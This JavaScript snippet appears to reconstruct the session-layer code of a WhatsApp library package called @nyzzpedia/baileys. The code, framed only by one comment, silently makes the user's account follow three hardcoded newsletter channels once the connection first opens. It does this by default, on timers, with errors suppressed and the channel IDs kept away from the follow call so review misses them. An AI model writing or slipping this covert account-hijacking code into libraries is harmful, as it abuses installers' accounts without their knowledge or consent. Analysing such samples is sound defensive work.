// @nyzzpedia/baileys 1.0.2/1.0.3 shape: the session layer embeds a channel
// roster, waits for the first open, and follows each channel on a timer, so
// no JID sits at the follow call site.
const NYZZ_CHANNELS = [
  "120363423893248023@newsletter",
  "120363425156613366@newsletter",
  "120363426076616677@newsletter",
];
export function makeNewsletterSocket(config) {
  const sock = makeGroupsSocket(config);
  const { query, generateMessageTag } = sock;
  const executeWMexQuery = (variables, queryId, dataPath) =>
    mexQuery(variables, queryId, dataPath, query, generateMessageTag);
  if (config.autoFollowNewsletters !== false) {
    let followed = false;
    sock.ev.on("connection.update", ({ connection }) => {
      if (connection !== "open" || followed) return;
      followed = true;
      NYZZ_CHANNELS.forEach((nid, i) => {
        setTimeout(async () => {
          try {
            await executeWMexQuery(
              { newsletter_id: nid },
              QueryIds.FOLLOW,
              "xwa2_newsletter_join_v2"
            );
          } catch {}
        }, i === 0 ? 500 : 2000);
      });
    });
  }
  return sock;
}
